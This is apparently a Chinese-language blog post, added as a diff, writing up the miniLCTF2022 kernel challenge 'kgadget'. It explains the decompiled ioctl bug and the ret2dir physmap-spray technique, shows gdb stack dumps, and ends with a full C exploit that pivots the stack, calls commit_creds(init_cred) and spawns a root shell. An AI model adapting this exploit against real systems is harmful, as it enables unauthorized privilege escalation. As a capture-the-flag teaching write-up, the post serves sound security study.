@@ -1,0 +1,333 @@
+---
+layout: post
+title:  kgadget(miniLCTF2022)
+date:   2025-01-05 00:08:01 +0300
+image:  2025-01-05-camping.jpg
+tags:   [ctf,Pwn,kernel,ROP,ret2dir]
+---
+
+ioctl，若 ioctl 的第二个参数为 114514 则会将第三个参数作为指针进行解引用，取其所指地址上值作为函数指针进行执行（这里编译器将其优化为 `__x86_indirect_thunk_rbx()` ，其实本质上就是 `call rbx` ）。
+
+```assembly
+// local variable allocation has failed, the output may be wrong!
+__int64 __fastcall kgadget_ioctl(file *__file, unsigned int cmd, unsigned __int64 param)
+{
+  __int64 *v3; // rdx
+  __int64 v4; // rsi
+  __int64 result; // rax
+
+  _fentry__(__file, *(_QWORD *)&cmd);
+  if ( cmd == 0x1BF52 )
+  {
+    v4 = *v3;
+    printk(&unk_370);
+    printk(&unk_3A0);
+    qmemcpy(
+      (void *)(((unsigned __int64)&STACK[0x1000] & 0xFFFFFFFFFFFFF000LL) - 0xA8),
+      "arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3",
+      0x30);
+    *(_QWORD *)(((unsigned __int64)&STACK[0x1000] & 0xFFFFFFFFFFFFF000LL) - 0x70) = 0x3361626E74747261LL;
+    printk(&unk_3F8);
+    _x86_indirect_thunk_rbx(&unk_3F8, v4);
+    result = 0LL;
+  }
+  else
+  {
+    printk(&unk_420);
+    result = 0xFFFFFFFFFFFFFFFFLL;
+  }
+  return result;
+}
+```
+
+在启动脚本中开启了 smep 与 smap 保护，所以我们不能够直接在用户空间构造 rop 然后 ret2usr
+
+这里使用[原论文](http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf)中的一种名为 `physmap spray` 的攻击手法——**使用 mmap 喷射大量的物理内存写入同样的 payload**，之后再随机挑选一个相对靠近高地址的 direct mapping area 上的地址进行利用，这样我们就**有很大的概率命中到我们布置的 payload 上**。
+
+经实测当我们喷射的内存页数量达到一定数量级时**总能准确地在 direct mapping area 靠中后部的区域命中我们的恶意数据**。
+
+最后就是 gadget 的挑选与 rop chain 的构造了，不难想到的是可以通过形如 `add rsp, val ; ret` 的 gadget 跳转到内核栈上的 `pt_regs` 上，在上面布置提权的 rop chain，但在本题当中 `pt_regs` 只有 r9 与 r8 两个寄存器可用，因为 `pt_regs` 被出题人提前进行了清理：
+
+```assembly
+qmemcpy(
+      (void *)(((unsigned __int64)&STACK[0x1000] & 0xFFFFFFFFFFFFF000LL) - 168),
+      "arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3",
+      48);
+*(_QWORD *)(((unsigned __int64)&STACK[0x1000] & 0xFFFFFFFFFFFFF000LL) - 112) = 0x3361626E74747261LL;
+```
+
+但其实仅有两个寄存器也够用了，我们可以利用 `pop_rsp ; ret` 的 gadget 进行栈迁移，**将栈迁移到我们在用户空间所布置的恶意数据上**，随后我们直接在恶意数据靠后的位置布置提权降落回用户态的 rop chain 即可。
+
+由于 buddy system 以页为单位进行内存分配，所以笔者也以页为单位进行 physmap spray，以求能消耗更多的物理内存，提高命中率，这里笔者懒得去计算偏移了，所以在每张内存页上布置的都是 “三段式” 的 rop chain，将我们跳转到 `pt_regs` 的 gadget 同时用作 slide code——
+
+```assembly
+------------------------
+add rsp, val ; ret 
+add rsp, val ; ret 
+add rsp, val ; ret 
+add rsp, val ; ret
+...
+add rsp, val ; ret # 该gadget必定会命中下一个区域中的一条ret，之后便能平缓地“滑”到常规的提权 rop 上
+------------------------
+ret
+ret
+...
+ret
+------------------------
+common root ROP chain
+------------------------
+```
+
+gdb调试
+
+> \# b entry_SYSCALL_64 # 可以在执行syscall后进行调试
+>
+> add-symbol-file ./rootfs/kgadget.ko 0xffffffffc0002000
+>
+> \# .text.unlikely:000000000000019A                 call    __x86_indirect_thunk_rbx ; PIC mode
+>
+> b *0xffffffffc000219a
+
+断在call时
+
+```assembly
+原始栈：
+gdb-peda$ x/50gx $rsp
+0xffffc9000029fee0:     0xffffc9000029ff58      0x33cac8b2e1712b00
+0xffffc9000029fef0:     0xffff888005566500      0xffffc9000029ff30
+0xffffc9000029ff00:     0xffffffff81319232      0xffffc9000029ff58
+0xffffc9000029ff10:     0x0000000000000000      0x0000000000000000
+0xffffc9000029ff20:     0x0000000000000000      0x0000000000000000
+0xffffc9000029ff30:     0xffffc9000029ff48      0xffffffff81bb9607
+0xffffc9000029ff40:     0x0000000000000000      0x0000000000000000
+0xffffc9000029ff50:     0xffffffff81c0008c      0x3361626e74747261
+0xffffc9000029ff60:     0x3361626e74747261      0x3361626e74747261
+0xffffc9000029ff70:     0x3361626e74747261      0x3361626e74747261 // ...    ; pop rbx;
+0xffffc9000029ff80:     0x3361626e74747261      0x0000000000000206 // pop r12; pop r13;
+0xffffc9000029ff90:     0x3361626e74747261      0xffffffff811483d0 // pop rbp; ret
+0xffffc9000029ffa0:     0xffff888007000000      0xffffffffffffffda
+0xffffc9000029ffb0:     0x0000000000401c2a      0xffff888007000000
+0xffffc9000029ffc0:     0x000000000001bf52      0x0000000000000003
+0xffffc9000029ffd0:     0x0000000000000010      0x0000000000401c2a
+0xffffc9000029ffe0:     0x0000000000000033      0x0000000000000206
+0xffffc9000029fff0:     0x00007fff24145940      0x000000000000002b
+0xffffc900002a0000:     Cannot access memory at address 0xffffc900002a0000
+......................
+......................
+[----------------------------------registers-----------------------------------]
+RAX: 0x24 ('$')
+RBX: 0xffffffff810737fe --> 0x5b000000a0c48148
+RCX: 0x0
+RDX: 0x0
+RSI: 0xffffdfff
+RDI: 0x247
+RBP: 0xffffc9000019fef8 --> 0xffffc9000019ff30 --> 0xffffc9000019ff48 --> 0x0
+RSP: 0xffffc9000019fed8 --> 0xffffffffc000219f --> 0xf0c7c74810ebc031
+RIP: 0xffffffff810737fe --> 0x5b000000a0c48148
+R8 : 0x0
+R9 : 0xc0000000ffffdfff
+R10: 0x1
+R11: 0xffffc9000019fcb0 --> 0x0
+R12: 0xffff8880054cbb00 --> 0x0
+R13: 0x1bf52
+R14: 0xffff888007000000 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+R15: 0x3
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xffffffff810737ef <can_optimize+383>:       mov    rcx,QWORD PTR [rbp-0x20]
+   0xffffffff810737f3 <can_optimize+387>:       xor    rcx,QWORD PTR gs:0x28
+   0xffffffff810737fc <can_optimize+396>:       jne    0xffffffff81073855 <can_optimize+485>
+=> 0xffffffff810737fe <can_optimize+398>:       add    rsp,0xa0
+   0xffffffff81073805 <can_optimize+405>:       pop    rbx
+   0xffffffff81073806 <can_optimize+406>:       pop    r12
+   0xffffffff81073808 <can_optimize+408>:       pop    r13
+   0xffffffff8107380a <can_optimize+410>:       pop    rbp
+[------------------------------------stack-------------------------------------]
+0000| 0xffffc9000019fed8 --> 0xffffffffc000219f --> 0xf0c7c74810ebc031
+0008| 0xffffc9000019fee0 --> 0xffffc9000019ff58 ("arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3\002\002")
+0016| 0xffffc9000019fee8 --> 0xf731839e04a5b400
+0024| 0xffffc9000019fef0 --> 0xffff8880054cbb00 --> 0x0
+0032| 0xffffc9000019fef8 --> 0xffffc9000019ff30 --> 0xffffc9000019ff48 --> 0x0
+0040| 0xffffc9000019ff00 --> 0xffffffff81319232 --> 0x49af75fffffdfd3d
+0048| 0xffffc9000019ff08 --> 0xffffc9000019ff58 ("arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3\002\002")
+0056| 0xffffc9000019ff10 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xffffffff810737fe in can_optimize ()
+gdb-peda$
+......................
+......................
+迁移后的栈：
+[----------------------------------registers-----------------------------------]
+RAX: 0x24 ('$')
+RBX: 0x3361626e74747261 ('arttnba3')
+RCX: 0x0
+RDX: 0x0
+RSI: 0xffffdfff
+RDI: 0x247
+RBP: 0x3361626e74747261 ('arttnba3')
+RSP: 0xffff888007000008 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+RIP: 0xffffffff810737fe --> 0x5b000000a0c48148
+R8 : 0x0
+R9 : 0xc0000000ffffdfff
+R10: 0x1
+R11: 0xffffc9000019fcb0 --> 0x0
+R12: 0x3361626e74747261 ('arttnba3')
+R13: 0x202
+R14: 0xffff888007000000 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+R15: 0x3
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xffffffff810737ef <can_optimize+383>:       mov    rcx,QWORD PTR [rbp-0x20]
+   0xffffffff810737f3 <can_optimize+387>:       xor    rcx,QWORD PTR gs:0x28
+   0xffffffff810737fc <can_optimize+396>:       jne    0xffffffff81073855 <can_optimize+485>
+=> 0xffffffff810737fe <can_optimize+398>:       add    rsp,0xa0
+   0xffffffff81073805 <can_optimize+405>:       pop    rbx
+   0xffffffff81073806 <can_optimize+406>:       pop    r12
+   0xffffffff81073808 <can_optimize+408>:       pop    r13
+   0xffffffff8107380a <can_optimize+410>:       pop    rbp
+[------------------------------------stack-------------------------------------]
+0000| 0xffff888007000008 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+0008| 0xffff888007000010 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+0016| 0xffff888007000018 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+0024| 0xffff888007000020 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+0032| 0xffff888007000028 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+0040| 0xffff888007000030 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+0048| 0xffff888007000038 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+0056| 0xffff888007000040 --> 0xffffffff810737fe --> 0x5b000000a0c48148
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xffffffff810737fe in can_optimize ()
+gdb-peda$
+```
+
+EXP:
+
+```assembly
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+
+// size_t  prepare_kernel_cred = 0xffffffff810c9540;
+size_t  commit_creds = 0xffffffff810c92e0;
+size_t  init_cred = 0xffffffff82a6b700;
+size_t  pop_rdi_ret = 0xffffffff8108c6f0;
+size_t  pop_rsp_ret = 0xffffffff811483d0;
+size_t  swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0 + 27;
+size_t  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0xffffffff810737fe;
+size_t  ret = 0xffffffff8108c6f1;
+
+void    (*kgadget_ptr)(void);
+size_t  *physmap_spray_arr[16000];
+size_t  page_size;
+size_t     try_hit;
+int     dev_fd;
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+
+void saveStatus(void){
+    __asm__("mov user_cs, cs;"
+            "mov user_ss, ss;"
+            "mov user_sp, rsp;"
+            "pushf;"
+            "pop user_rflags;"
+            );
+    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+}
+
+void errExit(char * msg){
+    printf("\033[31m\033[1m[x] Error : \033[0m%s\n", msg);
+    exit(EXIT_FAILURE);
+}
+
+void getRootShell(void){   
+    puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");
+
+    if(getuid()){
+        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
+        exit(-1);
+    }
+
+    puts("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m");
+    system("/bin/sh");
+    exit(0);// to exit the process normally instead of segmentation fault
+}
+
+void constructROPChain(size_t *rop){
+    int idx = 0;
+
+    // gadget to trigger pt_regs and for slide
+    for (; idx < (page_size / 8 - 0x30); idx++)
+        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;
+
+    // more normal slide code
+    for (; idx < (page_size / 8 - 0x10); idx++)
+        rop[idx] = ret;
+
+    // rop chain
+    rop[idx++] = pop_rdi_ret;
+    rop[idx++] = init_cred;
+    rop[idx++] = commit_creds;
+    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;
+    rop[idx++] = *(size_t*) "arttnba3";
+    rop[idx++] = *(size_t*) "arttnba3";
+    rop[idx++] = (size_t) getRootShell;
+    rop[idx++] = user_cs;
+    rop[idx++] = user_rflags;
+    rop[idx++] = user_sp;
+    rop[idx++] = user_ss;
+}
+
+
+int main(int argc, char **argv, char **envp){
+    saveStatus();
+
+    dev_fd = open("/dev/kgadget", O_RDWR);
+    if (dev_fd < 0)
+        errExit("dev fd!");
+
+    page_size = sysconf(_SC_PAGESIZE);
+
+    // construct per-page rop chain
+    physmap_spray_arr[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    constructROPChain(physmap_spray_arr[0]);
+
+    // spray physmap, so that we can easily hit one of them
+    puts("[*] Spraying physmap...");
+    for (int i = 1; i < 15000; i++)
+    {
+        physmap_spray_arr[i] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (!physmap_spray_arr[i])
+            errExit("oom for physmap spray!");
+        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], page_size);
+    }
+
+    puts("[*] trigger physmap one_gadget...");
+    //sleep(5);
+
+    try_hit = 0xffff888000000000 + 0x7000000;
+    __asm__(
+        "mov r15,   0xbeefdead;"
+        "mov r14,   0x11111111;"
+        "mov r13,   0x22222222;"
+        "mov r12,   0x33333333;"
+        "mov rbp,   0x44444444;"
+        "mov rbx,   0x55555555;"
+        "mov r11,   0x66666666;"
+        "mov r10,   0x77777777;"
+        "mov r9,    pop_rsp_ret;"   // stack migration again
+        "mov r8,    try_hit;"
+        "mov rax,   0x10;"
+        "mov rcx,   0xaaaaaaaa;"
+        "mov rdx,   try_hit;"
+        "mov rsi,   0x1bf52;"
+        "mov rdi,   dev_fd;"
+        "syscall"
+    );
+}
+```
+
